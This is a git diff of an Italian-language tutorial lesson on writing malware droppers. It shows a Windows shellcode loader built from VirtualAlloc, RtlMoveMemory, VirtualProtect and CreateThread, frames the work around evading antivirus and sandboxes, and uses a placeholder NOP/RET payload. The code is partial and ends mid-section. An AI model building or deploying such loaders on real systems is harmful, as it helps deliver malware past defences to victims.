@@ -1,8 +1,8 @@
 ## Lezione 1: Droppers ##
-### Cosa è un Dropper ###
+### 1. Cosa è un Dropper ###
 I **droppers** sono dei programmi creati principalmente con l’obiettivo di diffondere un malware, un virus o una backdoor verso un computer bersaglio in modo tale da evitarne, attraverso l’utilizzo di sofisticate tecniche di offuscamento, il rilevamento da parte degli antivirus (e Sandbox). Un dropper sofisticato può essere utilizzato anche per sopravvivere al riavvio della macchina (**persistenza**) o per eseguire una ricognizione approfondita locale e della rete della vittima (***movimento laterale***).
 
-### Dove memorizzare il payload? ###
+### 2. Dove memorizzare il payload? ###
 Ora immergiamoci nello sviluppo del dropper. Il payload, nel caso di un dropper EXE, può essere memorizzato in una delle tre sezioni di un file eseguibile (PE – Portable Executable). La scelta della sezione (sections) da utilizzare varierà drasticamente il codice di implementazione. Diamo uno sguardo alle sezioni disponibili in un file PE:
 
 ![image](https://user-images.githubusercontent.com/85390166/180658227-f0e867e9-e381-4ad2-9712-998a9db2d1b1.png)
@@ -13,9 +13,9 @@ Ora immergiamoci nello sviluppo del dropper. Il payload, nel caso di un dropper 
 
 Ora analizziamo le funzioni WINAPI che il nostro dropper utilizzerà per il rilascio del payload.
 
-### WINAPI ###
+### 3. WINAPI ###
 Le WINAPI utilizzate nel nostro Dropper sono le seguenti: VirtualAlloc, RtlMoveMemory, VirtualProtect, CreateThread, WaitForSingleObject. Di seguito l’analisi dettagliata delle singole API.
-### VirtualAlloc ###
+#### 3.1 VirtualAlloc ####
 Tale funzione riserverà una regione di pagine (memory buffer) nello spazio degli indirizzi virtuali del processo chiamante per il nostro payload. E’ un modo che ci aiuta a “creare” lo spazio in memoria che conterrà il nostro payload.
 Sintassi:
 ```cpp
@@ -26,7 +26,7 @@ LPVOID VirtualAlloc(
   [in]           DWORD  flProtect
 );
 ```
-### RtlMoveMemory ###
+#### 3.2 RtlMoveMemory ####
 E’ una API che ci permette di copiare un blocco di memoria sorgente in un blocco di memoria di destinazione. Nel nostro caso andremo a copiare  il payload nel nostro nuovo buffer creato.
 ```cpp
 VOID RtlMoveMemory(
@@ -35,7 +35,7 @@ VOID RtlMoveMemory(
   _In_        SIZE_T         Length
 );
 ```
-### VirtualProtect ###
+#### 3.3 VirtualProtect ####
 Una funzione fondamentale per il cambio delle protezioni delle regioni di memoria degli indirizzi virtuali. Lo utilizzeremo per rendere eseguibile il nostro nuovo buffer creato.
 ```cpp
 BOOL VirtualProtect(
@@ -45,7 +45,7 @@ BOOL VirtualProtect(
   [out] PDWORD lpflOldProtect
 );
 ```
-### CreateThread ###
+#### 3.4 CreateThread ####
 Una funzione semplice da comprendere. Crea un Thread del payload da eseguire nello spazio degli indirizzi virtuali del processo chiamante.
 ```cpp
 HANDLE CreateThread(
@@ -57,7 +57,7 @@ HANDLE CreateThread(
   [out, optional] LPDWORD                 lpThreadId
 );
 ```
-### WaitForSingleObject ###
+#### 3.5 WaitForSingleObject ####
 Attende finché l’oggetto specificato non si trova nello stato segnalato o finché non scade l’intervallo di time-out. Verrà utilizzato per verificare che non vi siano errori con il cambio di protezione apportato da VirtualProtect e che quindi il Thread del payload può essere creato.
 ```cpp
 DWORD WaitForSingleObject(
@@ -65,7 +65,7 @@ DWORD WaitForSingleObject(
   [in] DWORD  dwMilliseconds
 );
 ```
-### Aggiungiamo il nostro payload ##
+### 4. Aggiungiamo il nostro payload ###
 Per prima cosa abbiamo la necessità di aggiunge al nostro dropper il codice del payload. Per far ciò ci basterà dichiarare un char[] che conterrà l’esadecimale dell’intero codice del nostro payload.
 **NB:** In questa sezione, attraverso l’uso di tecniche di offuscamento, è possibile codificare il codice del payload per renderlo FUD (fully undetectable). Affronteremo questo argomento nei prossimi episodi.
 Implementiamo la procedura:
@@ -79,15 +79,17 @@ unsigned char payload[] = { // Qui andrà posizionato il nostro codice.
 	0xc3		// RET
 };
 unsigned int dwSize = sizeof(payload) / sizeof(char); // Calcoliamo le dimensioni del nostro payload (verrà utilizzato successivamente per l’allocazione della memoria necessaria a contenere il nostro payload).
-### Allocazione del memory buffer ###
+```
+### 5. Allocazione del memory buffer ###
 Ora bisogna allocare un memory buffer in modo da “trasferire” in memoria il nostro payload da avviare successivamente.
 Implementiamo la procedura:
+```
 // Allocazione della memoria necessaria a contenere il payload (memory buffer)
 exec_mem = VirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 // Copia del payload nel nuovo buffer
 RtlMoveMemory(exec_mem, payload, dwSize);
 ```
-### Avvio del payload ###
+### 6. Avvio del payload ###
 Bene, siamo giunti al termine di questo episodio. Ora non ci resta che avviare il payload grazie all’uso di un Thread. 
 Implementiamo la procedura:
 ```cpp
